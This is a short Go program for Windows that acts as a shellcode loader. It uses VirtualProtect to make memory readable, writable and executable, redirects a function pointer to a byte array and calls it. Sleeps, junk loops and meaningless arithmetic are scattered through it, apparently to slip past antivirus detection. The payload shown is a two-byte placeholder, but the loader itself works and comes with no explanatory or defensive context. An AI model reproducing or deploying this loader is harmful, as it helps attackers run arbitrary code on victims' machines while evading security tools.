package main

import (
	"syscall"
	"time"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect1(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	///ad
	gd()
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	ret = ret + 1
	ret = ret + 1 - 2
	return ret > 0
}
func gd() int64 {
	time.Sleep(time.Duration(2) * time.Second)
	var num = 1
	for {
		if num > 5 {
			break
		}
		num++
		//fmt.Println(num)
	}
	dd := time.Now().UTC().UnixNano()
	return dd + 1234546

}
func run(scd []byte) {

	ff := func() {}
	gd()
	var oldfperms uint32
	if !VirtualProtect1(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&ff))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("f!")
	}

	**(**uintptr)(unsafe.Pointer(&ff)) = *(*uintptr)(unsafe.Pointer(&scd))
	gd()
	var old uint32
	if !VirtualProtect1(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&scd))), uintptr(len(scd)), uint32(0x40), unsafe.Pointer(&old)) {
		panic("f")
	}
	gd()
	ff()
}

func main() {
	sc := []byte{0x11, 0x33}
	gd()
	run(sc)
}
